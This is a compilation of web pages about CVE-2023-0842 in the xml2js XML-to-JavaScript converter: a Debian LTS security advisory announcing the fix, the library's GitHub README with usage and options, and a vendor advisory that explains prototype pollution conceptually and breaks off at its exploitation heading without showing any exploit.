=== Content from lists.debian.org_6e028f33_20250115_080556.html ===


---

[[Date Prev](msg00012.html)][[Date Next](msg00014.html)]
[[Thread Prev](msg00012.html)][[Thread Next](msg00014.html)]
[[Date Index](maillist.html#00013)]
[[Thread Index](threads.html#00013)]

# [SECURITY] [DLA 3760-1] node-xml2js security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3760-1] node-xml2js security update
* *From*: Adrian Bunk <bunk@debian.org>
* *Date*: Thu, 14 Mar 2024 22:06:14 +0200
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/ZfNYttES2ix64pys%40localhost)Â [ZfNYttES2ix64pys@localhost](msg00013.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian LTS Advisory DLA-3760-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                          Adrian Bunk
March 14, 2024                                <https://wiki.debian.org/LTS>
- -------------------------------------------------------------------------

Package        : node-xml2js
Version        : 0.2.8-1.1+deb11u1~deb10u1
CVE ID         : CVE-2023-0842
Debian Bug     : 1034148

Prototype pollution has been fixed in node-xml2js, an XML to JavaScript
object converter.

For Debian 10 buster, this problem has been fixed in version
0.2.8-1.1+deb11u1~deb10u1.

We recommend that you upgrade your node-xml2js packages.

For the detailed security status of node-xml2js please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/node-xml2js>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEOvp1f6xuoR0v9F3wiNJCh6LYmLEFAmXzWLYACgkQiNJCh6LY
mLGCXQ/+OGOGr54c9cTgUSbvQ7owfIcFUG5xpvIAWa2NdKXMyOiANMBNOu9Ugod6
gZdyDhXGw8hlhF5EnSIXVUEo8a9SoJcL47eCXW+rgV7q8+TkOBUDn2UI+fw55Zca
oADxq3lfsG01PrRVRpr+DoGpNV0wzt+uZP3Z3c+AHKaKmdiavVzUc07ebFq99NUg
9teJwhNODx/NIeZBBkWetR0XRaLWmzOtKLB4X/nt4k6lvBmbH9ZqftoNxAwbFn3a
6LsBHhS3OGiIJqdaSuUAFO+hMeU1Bka0ia1QBM8j5tqSAPn7t0Q3Rz7OQP1dOq3V
dnJHLI3TEhr2j48ZJMLRgpA87bEK50rSjhxumqyqCqtNLuKq/PHXQ8mYcPFrYO9a
JhOF7vHiA+4QsDOICHebGsvNxRLiWFjObqcW34UnyyeC5m3lNPKEeNE3gZRXPpqD
zZ01UzMkmP/BoI1TnxqMdCd4gCwYEY1jJAo6EaNkdxe2DHDBvvh9/mvIPIxVr2Kc
FPZtNEVUB7QV5TsZdnJPBn4RmqQ/xyydcfXiREcCA5r01UFXhqqv3zhdGBwly5uy
jGD+YGmXt6LZvkQhDo8VWfESvR7KX4iq1ACNtNj7EkCBqC/TP4ewgZ/QmvY8wvHI
/uETBCZODFZ+nUsjjZ4srU7dlAlReoGoh6tNeiGU1qmgYCMoxjk=
=aSei
-----END PGP SIGNATURE-----

```

---



=== Content from github.com_b80ec024_20250115_080555.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLeonidas-from-XIV%2Fnode-xml2js%2F)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLeonidas-from-XIV%2Fnode-xml2js%2F)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Leonidas-from-XIV%2Fnode-xml2js)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Leonidas-from-XIV](/Leonidas-from-XIV)
/
**[node-xml2js](/Leonidas-from-XIV/node-xml2js)**
Public

* [Notifications](/login?return_to=%2FLeonidas-from-XIV%2Fnode-xml2js) You must be signed in to change notification settings
* [Fork
  604](/login?return_to=%2FLeonidas-from-XIV%2Fnode-xml2js)
* [Star
   4.9k](/login?return_to=%2FLeonidas-from-XIV%2Fnode-xml2js)

XML to JavaScript object converter.

### License

[MIT license](/Leonidas-from-XIV/node-xml2js/blob/master/LICENSE)

[4.9k
stars](/Leonidas-from-XIV/node-xml2js/stargazers) [604
forks](/Leonidas-from-XIV/node-xml2js/forks) [Branches](/Leonidas-from-XIV/node-xml2js/branches) [Tags](/Leonidas-from-XIV/node-xml2js/tags) [Activity](/Leonidas-from-XIV/node-xml2js/activity)
 [Star](/login?return_to=%2FLeonidas-from-XIV%2Fnode-xml2js)

 [Notifications](/login?return_to=%2FLeonidas-from-XIV%2Fnode-xml2js) You must be signed in to change notification settings

* [Code](/Leonidas-from-XIV/node-xml2js)
* [Issues
  203](/Leonidas-from-XIV/node-xml2js/issues)
* [Pull requests
  43](/Leonidas-from-XIV/node-xml2js/pulls)
* [Actions](/Leonidas-from-XIV/node-xml2js/actions)
* [Security](/Leonidas-from-XIV/node-xml2js/security)
* [Insights](/Leonidas-from-XIV/node-xml2js/pulse)

Additional navigation options

* [Code](/Leonidas-from-XIV/node-xml2js)
* [Issues](/Leonidas-from-XIV/node-xml2js/issues)
* [Pull requests](/Leonidas-from-XIV/node-xml2js/pulls)
* [Actions](/Leonidas-from-XIV/node-xml2js/actions)
* [Security](/Leonidas-from-XIV/node-xml2js/security)
* [Insights](/Leonidas-from-XIV/node-xml2js/pulse)

# Leonidas-from-XIV/node-xml2js

   Â master[Branches](/Leonidas-from-XIV/node-xml2js/branches)[Tags](/Leonidas-from-XIV/node-xml2js/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commitÂ History[445 Commits](/Leonidas-from-XIV/node-xml2js/commits/master/) | | |
| [lib](/Leonidas-from-XIV/node-xml2js/tree/master/lib "lib") | | [lib](/Leonidas-from-XIV/node-xml2js/tree/master/lib "lib") |  |  |
| [src](/Leonidas-from-XIV/node-xml2js/tree/master/src "src") | | [src](/Leonidas-from-XIV/node-xml2js/tree/master/src "src") |  |  |
| [test](/Leonidas-from-XIV/node-xml2js/tree/master/test "test") | | [test](/Leonidas-from-XIV/node-xml2js/tree/master/test "test") |  |  |
| [.gitignore](/Leonidas-from-XIV/node-xml2js/blob/master/.gitignore ".gitignore") | | [.gitignore](/Leonidas-from-XIV/node-xml2js/blob/master/.gitignore ".gitignore") |  |  |
| [CONTRIBUTING.md](/Leonidas-from-XIV/node-xml2js/blob/master/CONTRIBUTING.md "CONTRIBUTING.md") | | [CONTRIBUTING.md](/Leonidas-from-XIV/node-xml2js/blob/master/CONTRIBUTING.md "CONTRIBUTING.md") |  |  |
| [Cakefile](/Leonidas-from-XIV/node-xml2js/blob/master/Cakefile "Cakefile") | | [Cakefile](/Leonidas-from-XIV/node-xml2js/blob/master/Cakefile "Cakefile") |  |  |
| [LICENSE](/Leonidas-from-XIV/node-xml2js/blob/master/LICENSE "LICENSE") | | [LICENSE](/Leonidas-from-XIV/node-xml2js/blob/master/LICENSE "LICENSE") |  |  |
| [README.md](/Leonidas-from-XIV/node-xml2js/blob/master/README.md "README.md") | | [README.md](/Leonidas-from-XIV/node-xml2js/blob/master/README.md "README.md") |  |  |
| [package-lock.json](/Leonidas-from-XIV/node-xml2js/blob/master/package-lock.json "package-lock.json") | | [package-lock.json](/Leonidas-from-XIV/node-xml2js/blob/master/package-lock.json "package-lock.json") |  |  |
| [package.json](/Leonidas-from-XIV/node-xml2js/blob/master/package.json "package.json") | | [package.json](/Leonidas-from-XIV/node-xml2js/blob/master/package.json "package.json") |  |  |
| View all files | | |

## Repository files navigation

* README
* MIT license
# node-xml2js

Ever had the urge to parse XML? And wanted to access the data in some sane,
easy way? Don't want to compile a C parser, for whatever reason? Then xml2js is
what you're looking for!

# Description

Simple XML to JavaScript object converter. It supports bi-directional conversion.
Uses [sax-js](https://github.com/isaacs/sax-js/) and
[xmlbuilder-js](https://github.com/oozcitak/xmlbuilder-js/).

Note: If you're looking for a full DOM parser, you probably want
[JSDom](https://github.com/tmpvar/jsdom).

# Installation

Simplest way to install `xml2js` is to use [npm](http://npmjs.org), just `npm install xml2js` which will download xml2js and all dependencies.

xml2js is also available via [Bower](http://bower.io/), just `bower install xml2js` which will download xml2js and all dependencies.

# Usage

No extensive tutorials required because you are a smart developer! The task of
parsing XML should be an easy one, so let's make it so! Here's some examples.

## Shoot-and-forget usage

You want to parse XML as simple and easy as possible? It's dangerous to go
alone, take this:

```
var parseString = require('xml2js').parseString;
var xml = "<root>Hello xml2js!</root>"
parseString(xml, function (err, result) {
    console.dir(result);
});
```

Can't get easier than this, right? This works starting with `xml2js` 0.2.3.
With CoffeeScript it looks like this:

```
{parseString} = require 'xml2js'
xml = "<root>Hello xml2js!</root>"
parseString xml, (err, result) ->
    console.dir result
```

If you need some special options, fear not, `xml2js` supports a number of
options (see below), you can specify these as second argument:

```
parseString(xml, {trim: true}, function (err, result) {
});
```

## Simple as pie usage

That's right, if you have been using xml-simple or a home-grown
wrapper, this was added in 0.1.11 just for you:

```
var fs = require('fs'),
    xml2js = require('xml2js');

var parser = new xml2js.Parser();
fs.readFile(__dirname + '/foo.xml', function(err, data) {
    parser.parseString(data, function (err, result) {
        console.dir(result);
        console.log('Done');
    });
});
```

Look ma, no event listeners!

You can also use `xml2js` from
[CoffeeScript](https://github.com/jashkenas/coffeescript), further reducing
the clutter:

```
fs = require 'fs',
xml2js = require 'xml2js'

parser = new xml2js.Parser()
fs.readFile __dirname + '/foo.xml', (err, data) ->
  parser.parseString data, (err, result) ->
    console.dir result
    console.log 'Done.'
```

But what happens if you forget the `new` keyword to create a new `Parser`? In
the middle of a nightly coding session, it might get lost, after all. Worry
not, we got you covered! Starting with 0.2.8 you can also leave it out, in
which case `xml2js` will helpfully add it for you, no bad surprises and
inexplicable bugs!

## Promise usage

```
var xml2js = require('xml2js');
var xml = '<foo></foo>';

// With parser
var parser = new xml2js.Parser(/* options */);
parser.parseStringPromise(xml).then(function (result) {
  console.dir(result);
  console.log('Done');
})
.catch(function (err) {
  // Failed
});

// Without parser
xml2js.parseStringPromise(xml /*, options */).then(function (result) {
  console.dir(result);
  console.log('Done');
})
.catch(function (err) {
  // Failed
});
```

## Parsing multiple files

If you want to parse multiple files, you have multiple possibilities:

* You can create one `xml2js.Parser` per file. That's the recommended one
  and is promised to always *just work*.
* You can call `reset()` on your parser object.
* You can hope everything goes well anyway. This behaviour is not
  guaranteed work always, if ever. Use option #1 if possible. Thanks!

## So you wanna some JSON?

Just wrap the `result` object in a call to `JSON.stringify` like this
`JSON.stringify(result)`. You get a string containing the JSON representation
of the parsed object that you can feed to JSON-hungry consumers.

## Displaying results

You might wonder why, using `console.dir` or `console.log` the output at some
level is only `[Object]`. Don't worry, this is not because `xml2js` got lazy.
That's because Node uses `util.inspect` to convert the object into strings and
that function stops after `depth=2` which is a bit low for most XML.

To display the whole deal, you can use `console.log(util.inspect(result, false, null))`, which displays the whole result.

So much for that, but what if you use
[eyes](https://github.com/cloudhead/eyes.js) for nice colored output and it
truncates the output with `â€¦`? Don't fear, there's also a solution for that,
you just need to increase the `maxLength` limit by creating a custom inspector
`var inspect = require('eyes').inspector({maxLength: false})` and then you can
easily `inspect(result)`.

## XML builder usage

Since 0.4.0, objects can be also be used to build XML:

```
var xml2js = require('xml2js');

var obj = {name: "Super", Surname: "Man", age: 23};

var builder = new xml2js.Builder();
var xml = builder.buildObject(obj);
```

will result in:

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<root>
  <name>Super</name>
  <Surname>Man</Surname>
  <age>23</age>
</root>
```

At the moment, a one to one bi-directional conversion is guaranteed only for
default configuration, except for `attrkey`, `charkey` and `explicitArray` options
you can redefine to your taste. Writing CDATA is supported via setting the `cdata`
option to `true`.

To specify attributes:

```
var xml2js = require('xml2js');

var obj = {root: {$: {id: "my id"}, _: "my inner text"}};

var builder = new xml2js.Builder();
var xml = builder.buildObject(obj);
```

will result in:

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<root id="my id">my inner text</root>
```

### Adding xmlns attributes

You can generate XML that declares XML namespace prefix / URI pairs with xmlns attributes.

Example declaring a default namespace on the root element:

```
let obj = {
  Foo: {
    $: {
      "xmlns": "http://foo.com"
    }
  }
};
```

Result of `buildObject(obj)`:

```
<Foo xmlns="http://foo.com"/>
```

Example declaring non-default namespaces on non-root elements:

```
let obj = {
  'foo:Foo': {
    $: {
      'xmlns:foo': 'http://foo.com'
    },
    'bar:Bar': {
      $: {
        'xmlns:bar': 'http://bar.com'
      }
    }
  }
}
```

Result of `buildObject(obj)`:

```
<foo:Foo xmlns:foo="http://foo.com">
  <bar:Bar xmlns:bar="http://bar.com"/>
</foo:Foo>
```

## Processing attribute, tag names and values

Since 0.4.1 you can optionally provide the parser with attribute name and tag name processors as well as element value processors (Since 0.4.14, you can also optionally provide the parser with attribute value processors):

```
function nameToUpperCase(name){
    return name.toUpperCase();
}

//transform all attribute and tag names and values to uppercase
parseString(xml, {
  tagNameProcessors: [nameToUpperCase],
  attrNameProcessors: [nameToUpperCase],
  valueProcessors: [nameToUpperCase],
  attrValueProcessors: [nameToUpperCase]},
  function (err, result) {
    // processed data
});
```

The `tagNameProcessors` and `attrNameProcessors` options
accept an `Array` of functions with the following signature:

```
function (name){
  //do something with `name`
  return name
}
```

The `attrValueProcessors` and `valueProcessors` options
accept an `Array` of functions with the following signature:

```
function (value, name) {
  //`name` will be the node name or attribute name
  //do something with `value`, (optionally) dependent on the node/attr name
  return value
}
```

Some processors are provided out-of-the-box and can be found in `lib/processors.js`:

* `normalize`: transforms the name to lowercase.
  (Automatically used when `options.normalize` is set to `true`)
* `firstCharLowerCase`: transforms the first character to lower case.
  E.g. 'MyTagName' becomes 'myTagName'
* `stripPrefix`: strips the xml namespace prefix. E.g `<foo:Bar/>` will become 'Bar'.
  (N.B.: the `xmlns` prefix is NOT stripped.)
* `parseNumbers`: parses integer-like strings as integers and float-like strings as floats
  E.g. "0" becomes 0 and "15.56" becomes 15.56
* `parseBooleans`: parses boolean-like strings to booleans
  E.g. "true" becomes true and "False" becomes false

# Options

Apart from the default settings, there are a number of options that can be
specified for the parser. Options are specified by `new Parser({optionName: value})`. Possible options are:

* `attrkey` (default: `$`): Prefix that is used to access the attributes.
  Version 0.1 default was `@`.
* `charkey` (default: `_`): Prefix that is used to access the character
  content. Version 0.1 default was `#`.
* `explicitCharkey` (default: `false`) Determines whether or not to use
  a `charkey` prefix for elements with no attributes.
* `trim` (default: `false`): Trim the whitespace at the beginning and end of
  text nodes.
* `normalizeTags` (default: `false`): Normalize all tag names to lowercase.
* `normalize` (default: `false`): Trim whitespaces inside text nodes.
* `explicitRoot` (default: `true`): Set this if you want to get the root
  node in the resulting object.
* `emptyTag` (default: `''`): what will the value of empty nodes be. In case
  you want to use an empty object as a default value, it is better to provide a factory
  function `() => ({})` instead. Without this function a plain object would
  become a shared reference across all occurrences with unwanted behavior.
* `explicitArray` (default: `true`): Always put child nodes in an array if
  true; otherwise an array is created only if there is more than one.
* `ignoreAttrs` (default: `false`): Ignore all XML attributes and only create
  text nodes.
* `mergeAttrs` (default: `false`): Merge attributes and child elements as
  properties of the parent, instead of keying attributes off a child
  attribute object. This option is ignored if `ignoreAttrs` is `true`.
* `validator` (default `null`): You can specify a callable that validates
  the resulting structure somehow, however you want. See unit tests
  for an example.
* `xmlns` (default `false`): Give each element a field usually called '$ns'
  (the first character is the same as attrkey) that contains its local name
  and namespace URI.
* `explicitChildren` (default `false`): Put child elements to separate
  property. Doesn't work with `mergeAttrs = true`. If element has no children
  then "children" won't be created. Added in 0.2.5.
* `childkey` (default `$$`): Prefix that is used to access child elements if
  `explicitChildren` is set to `true`. Added in 0.2.5.
* `preserveChildrenOrder` (default `false`): Modifies the behavior of
  `explicitChildren` so that the value of the "children" property becomes an
  ordered array. When this is `true`, every node will also get a `#name` field
  whose value will correspond to the XML nodeName, so that you may iterate
  the "children" array and still be able to determine node names. The named
  (and potentially unordered) properties are also retained in this
  configuration at the same level as the ordered "children" array. Added in
  0.4.9.
* `charsAsChildren` (default `false`): Determines whether chars should be
  considered children if `explicitChildren` is on. Added in 0.2.5.
* `includeWhiteChars` (default `false`): Determines whether whitespace-only
  text nodes should be included. Added in 0.4.17.
* `async` (default `false`): Should the callbacks be async? This *might* be
  an incompatible change if your code depends on sync execution of callbacks.
  Future versions of `xml2js` might change this default, so the recommendation
  is to not depend on sync execution anyway. Added in 0.2.6.
* `strict` (default `true`): Set sax-js to strict or non-strict parsing mode.
  Defaults to `true` which is *highly* recommended, since parsing HTML which
  is not well-formed XML might yield just about anything. Added in 0.2.7.
* `attrNameProcessors` (default: `null`): Allows the addition of attribute
  name processing functions. Accepts an `Array` of functions with following
  signature:
  ```
  function (name){
      //do something with `name`
      return name
  }
  ```

  Added in 0.4.14
* `attrValueProcessors` (default: `null`): Allows the addition of attribute
  value processing functions. Accepts an `Array` of functions with following
  signature:
  ```
  function (value, name){
    //do something with `name`
    return name
  }
  ```

  Added in 0.4.1
* `tagNameProcessors` (default: `null`): Allows the addition of tag name
  processing functions. Accepts an `Array` of functions with following
  signature:
  ```
  function (name){
    //do something with `name`
    return name
  }
  ```

  Added in 0.4.1
* `valueProcessors` (default: `null`): Allows the addition of element value
  processing functions. Accepts an `Array` of functions with following
  signature:
  ```
  function (value, name){
    //do something with `name`
    return name
  }
  ```

  Added in 0.4.6

## Options for the `Builder` class

These options are specified by `new Builder({optionName: value})`.
Possible options are:

* `attrkey` (default: `$`): Prefix that is used to access the attributes.
  Version 0.1 default was `@`.
* `charkey` (default: `_`): Prefix that is used to access the character
  content. Version 0.1 default was `#`.
* `rootName` (default `root` or the root key name): root element name to be used in case
  `explicitRoot` is `false` or to override the root element name.
* `renderOpts` (default `{ 'pretty': true, 'indent': ' ', 'newline': '\n' }`):
  Rendering options for xmlbuilder-js.
  + pretty: prettify generated XML
  + indent: whitespace for indentation (only when pretty)
  + newline: newline char (only when pretty)
* `xmldec` (default `{ 'version': '1.0', 'encoding': 'UTF-8', 'standalone': true }`:
  XML declaration attributes.
  + `xmldec.version` A version number string, e.g. 1.0
  + `xmldec.encoding` Encoding declaration, e.g. UTF-8
  + `xmldec.standalone` standalone document declaration: true or false
* `doctype` (default `null`): optional DTD. Eg. `{'ext': 'hello.dtd'}`
* `headless` (default: `false`): omit the XML header. Added in 0.4.3.
* `allowSurrogateChars` (default: `false`): allows using characters from the Unicode
  surrogate blocks.
* `cdata` (default: `false`): wrap text nodes in `<![CDATA[ ... ]]>` instead of
  escaping when necessary. Does not add `<![CDATA[ ... ]]>` if it is not required.
  Added in 0.4.5.

`renderOpts`, `xmldec`,`doctype` and `headless` pass through to
[xmlbuilder-js](https://github.com/oozcitak/xmlbuilder-js).

# Updating to new version

Version 0.2 changed the default parsing settings, but version 0.1.14 introduced
the default settings for version 0.2, so these settings can be tried before the
migration.

```
var xml2js = require('xml2js');
var parser = new xml2js.Parser(xml2js.defaults["0.2"]);
```

To get the 0.1 defaults in version 0.2 you can just use
`xml2js.defaults["0.1"]` in the same place. This provides you with enough time
to migrate to the saner way of parsing in `xml2js` 0.2. We try to make the
migration as simple and gentle as possible, but some breakage cannot be
avoided.

So, what exactly did change and why? In 0.2 we changed some defaults to parse
the XML in a more universal and sane way. So we disabled `normalize` and `trim`
so `xml2js` does not cut out any text content. You can reenable this at will of
course. A more important change is that we return the root tag in the resulting
JavaScript structure via the `explicitRoot` setting, so you need to access the
first element. This is useful for anybody who wants to know what the root node
is and preserves more information. The last major change was to enable
`explicitArray`, so everytime it is possible that one might embed more than one
sub-tag into a tag, xml2js >= 0.2 returns an array even if the array just
includes one element. This is useful when dealing with APIs that return
variable amounts of subtags.

# Running tests, development

[![Build Status](https://camo.githubusercontent.com/478fc9244ca63cefec5d731b635935795bbe9dfc80cf60fea1ecb905fa073b7b/68747470733a2f2f7472617669732d63692e6f72672f4c656f6e696461732d66726f6d2d5849562f6e6f64652d786d6c326a732e7376673f6272616e63683d6d6173746572)](https://travis-ci.org/Leonidas-from-XIV/node-xml2js)
[![Coverage Status](https://camo.githubusercontent.com/d109fe0ea8df3dbef7aba5e0938ae4167d26d76b77c428956eae9eec33d1a842/68747470733a2f2f636f766572616c6c732e696f2f7265706f732f4c656f6e696461732d66726f6d2d5849562f6e6f64652d786d6c326a732f62616467652e7376673f6272616e63683d)](https://coveralls.io/r/Leonidas-from-XIV/node-xml2js?branch=master)
[![Dependency Status](https://camo.githubusercontent.com/e46982a248c451c7b36355d2648d69d911ecf41d8ab0981d48c53042e844ae75/68747470733a2f2f64617669642d646d2e6f72672f4c656f6e696461732d66726f6d2d5849562f6e6f64652d786d6c326a732e737667)](https://david-dm.org/Leonidas-from-XIV/node-xml2js)

The development requirements are handled by npm, you just need to install them.
We also have a number of unit tests, they can be run using `npm test` directly
from the project root. This runs zap to discover all the tests and execute
them.

If you like to contribute, keep in mind that `xml2js` is written in
CoffeeScript, so don't develop on the JavaScript files that are checked into
the repository for convenience reasons. Also, please write some unit test to
check your behaviour and if it is some user-facing thing, add some
documentation to this README, so people will know it exists. Thanks in advance!

# Getting support

Please, if you have a problem with the library, first make sure you read this
README. If you read this far, thanks, you're good. Then, please make sure your
problem really is with `xml2js`. It is? Okay, then I'll look at it. Send me a
mail and we can talk. Please don't open issues, as I don't think that is the
proper forum for support problems. Some problems might as well really be bugs
in `xml2js`, if so I'll let you know to open an issue instead :)

But if you know you really found a bug, feel free to open an issue instead.

## About

XML to JavaScript object converter.

### Topics

[nodejs](/topics/nodejs "Topic: nodejs")
[javascript](/topics/javascript "Topic: javascript")
[coffeescript](/topics/coffeescript "Topic: coffeescript")
[node](/topics/node "Topic: node")
[parsing](/topics/parsing "Topic: parsing")
[xml](/topics/xml "Topic: xml")
[xml2json](/topics/xml2json "Topic: xml2json")
[xml-parser](/topics/xml-parser "Topic: xml-parser")
[node-js](/topics/node-js "Topic: node-js")
[xml2js](/topics/xml2js "Topic: xml2js")

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)

[Activity](/Leonidas-from-XIV/node-xml2js/activity)
### Stars

[**4.9k**
stars](/Leonidas-from-XIV/node-xml2js/stargazers)
### Watchers

[**71**
watching](/Leonidas-from-XIV/node-xml2js/watchers)
### Forks

[**604**
forks](/Leonidas-from-XIV/node-xml2js/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FLeonidas-from-XIV%2Fnode-xml2js&report=Leonidas-from-XIV+%28user%29)

## [Releases](/Leonidas-from-XIV/node-xml2js/releases)

[44
tags](/Leonidas-from-XIV/node-xml2js/tags)

## [Packages 0](/users/Leonidas-from-XIV/packages?repo_name=node-xml2js)

No packages published

## [Contributors 66](/Leonidas-from-XIV/node-xml2js/graphs/contributors)

* [![@Leonidas-from-XIV](https://avatars.githubusercontent.com/u/121531?s=64&v=4)](https://github.com/Leonidas-from-XIV)
* [![@tflanagan](https://avatars.githubusercontent.com/u/5559820?s=64&v=4)](https://github.com/tflanagan)
* [![@maqr](https://avatars.githubusercontent.com/u/303930?s=64&v=4)](https://github.com/maqr)
* [![@neopunisher](https://avatars.githubusercontent.com/u/73310?s=64&v=4)](https://github.com/neopunisher)
* [![@ryedin](https://avatars.githubusercontent.com/u/151376?s=64&v=4)](https://github.com/ryedin)
* [![@JacksonTian](https://avatars.githubusercontent.com/u/327019?s=64&v=4)](https://github.com/JacksonTian)
* [![@markwhitfeld](https://avatars.githubusercontent.com/u/1948265?s=64&v=4)](https://github.com/markwhitfeld)
* [![@jcsahnwaldt](https://avatars.githubusercontent.com/u/607468?s=64&v=4)](https://github.com/jcsahnwaldt)
* [![@Sitin](https://avatars.githubusercontent.com/u/1565939?s=64&v=4)](https://github.com/Sitin)
* [![@leipert](https://avatars.githubusercontent.com/u/2906107?s=64&v=4)](https://github.com/leipert)
* [![@Chris-ScoutCorps](https://avatars.githubusercontent.com/u/6041598?s=64&v=4)](https://github.com/Chris-ScoutCorps)
* [![@raoulmillais](https://avatars.githubusercontent.com/u/302663?s=64&v=4)](https://github.com/raoulmillais)
* [![@creynders](https://avatars.githubusercontent.com/u/436347?s=64&v=4)](https://github.com/creynders)
* [![@Raynos](https://avatars.githubusercontent.com/u/479538?s=64&v=4)](https://github.com/Raynos)

[+ 52 contributors](/Leonidas-from-XIV/node-xml2js/graphs/contributors)

## Languages

* [CoffeeScript
  100.0%](/Leonidas-from-XIV/node-xml2js/search?l=coffeescript)

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from fluidattacks.com_88ece280_20250115_080554.html ===
[Contact us](/contact-us/)SearchEnglishEnglishEspaÃƒÂ±ol

* [![Fluid Attacks logo navbar](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/menu/Logo?_a=AXAJYUZ0.webp)](/)
ServicePlatform[Plans](/plans/)Resources[Advisories](/advisories/)Company[Log in](https://app.fluidattacks.com/)[Try for free](https://app.fluidattacks.com/SignUp)
# xml2js 0.4.23 - Prototype Pollution

## Summary

|  |  |
| --- | --- |
| **Name** | xml2js 0.4.23 - Prototype Pollution |
| **Code name** | [Myers](https://en.wikipedia.org/wiki/Bryant_Myers) |
| **Product** | mdpdf |
| **Affected versions** | Version 0.4.23 |
|
| **State** | Public |
| **Release date** | 2023-04-10 |

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | Prototype Pollution |
| **Rule** | [390. Prototype Pollution](https://docs.fluidattacks.com/criteria/vulnerabilities/390) |
| **Remote** | Yes |
| **CVSSv3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L |
| **CVSSv3.1 Base Score** | 7.3 |
| **Exploit available** | Yes |
| **CVE ID(s)** | [CVE-2023-0842](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0842) |

## Description

xml2js version 0.4.23 allows an external attacker to edit or add new
properties to an object. This is possible because the application does
not properly validate incoming JSON keys, thus allowing the `__proto__`
property to be edited.

## Vulnerability

Prototype pollution is a vulnerability that affects JS. It occurs when a
third party manages to modify the `__proto__` of an object. JavaScript
first checks if such a method/attribute exists in the object. If so, then
it calls it. If not, it looks in the object's prototype. If the method/attribute
is also not in the object's prototype, then the property is said to be undefined.

Therefore, if an attacker succeeds in injecting the `__proto__` property into an
object, he will succeed in injecting or editing its properties.

## Exploitation

